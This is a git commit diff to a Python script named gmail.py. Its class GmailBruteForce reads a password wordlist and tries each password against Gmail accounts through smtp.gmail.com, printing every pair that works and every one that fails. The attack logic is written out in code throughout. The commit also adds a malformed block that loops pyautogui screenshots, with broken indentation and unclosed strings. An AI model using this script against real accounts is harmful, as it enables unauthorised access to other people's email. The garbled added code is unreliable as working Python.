6851b67ab583178ba99f8d93c9aeb22437a8c608
Gilmarfilho2003 <89646761+Gilmarfilho2003@users.noreply.github.com>
2021-09-14 16:37:34 -0300

    Update gmail.py

--- gmail.py
+++ gmail.py
@@ -19,6 +19,7 @@ class GmailBruteForce():
         file = open(path, 'r',encoding='utf8').read().splitlines()
         for line in file:
             self.passwords.append(line)
+
     def init_smtplib(self):
         self.smtp = smtplib.SMTP("smtp.gmail.com",587)
         self.smtp.starttls()
@@ -30,17 +31,21 @@ class GmailBruteForce():
             for password in self.passwords:
                 try:
                     self.smtp.login(user,password)
-                    print(("\033[1;37machei -> %s " % user + " -> %s \033[1;m" % password )) 
-			import string,random
-		print(senha)
-		print(("\033[1;37machei -> %s " % user + " -> %s \033[1;m" % password )) 
-
+                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
                     self.smtp.quit()
                     self.init_smtplib()
                     break;
                 except smtplib.SMTPAuthenticationError:
                     # print("\033[1;31msorry \033[1;m")
-                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))  
+                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
+			import pyautogui
+import time #>..
+for i in range(1,10+1): #10fotos
+       foto=pyautogui.screenshot()
+       time.sleep(5)
+        foto.save("foto1%d.png%(i))
+        print("Working %d (i))
+print("Worked") 
 
 print('''
 	
